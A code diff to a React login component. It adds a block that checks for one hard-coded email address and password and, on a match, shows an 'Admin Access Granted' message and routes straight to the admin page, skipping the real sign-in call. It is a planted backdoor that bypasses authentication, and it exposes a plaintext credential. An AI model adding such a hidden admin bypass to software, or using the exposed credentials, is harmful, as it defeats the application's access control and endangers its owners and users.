@@ -75,6 +75,17 @@ const Auth = () => {
     setLoading(true);
     
     try {
+      // Special admin access check
+      if (email === "k8716610@gmail.com" && password === "9848+-ab") {
+        toast({
+          title: "Admin Access Granted",
+          description: "Welcome to the admin panel!",
+        });
+        // Navigate to admin page directly
+        navigate("/admin");
+        return;
+      }
+      
       const result = await signIn(email, password);
       
       if (!result.success) {
